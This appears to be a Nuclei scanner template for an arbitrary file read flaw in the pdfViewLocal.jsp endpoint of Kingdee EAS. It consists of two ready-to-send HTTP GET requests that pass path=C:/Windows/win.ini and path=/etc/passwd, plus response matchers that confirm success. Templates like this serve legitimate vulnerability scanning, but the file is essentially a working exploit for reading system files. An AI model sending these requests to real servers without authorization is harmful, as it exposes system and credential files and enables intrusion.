id: Jindie-EAS-pdfviewlocal-File-reading

info:
  name: 金蝶 EAS pdfviewlocal.jsp接口存在任意文件读取
  author: HuanXiong
  severity: high

  tags: File Reading

http:
  - raw:
      - |+
        GET /plt_document/fragments/content/pdfViewLocal.jsp?path=C:/Windows/win.ini HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive
        Cookie: LocLan=zh_CN
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "bit app support"
          - "fonts"
          - "extensions"
      - type: status
        status:
          - 200
          
  - raw:
      - |+
        GET /plt_document/fragments/content/pdfViewLocal.jsp?path=/etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive
        Cookie: LocLan=zh_CN
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "root"
          - "ftp"
      - type: status
        status:
          - 200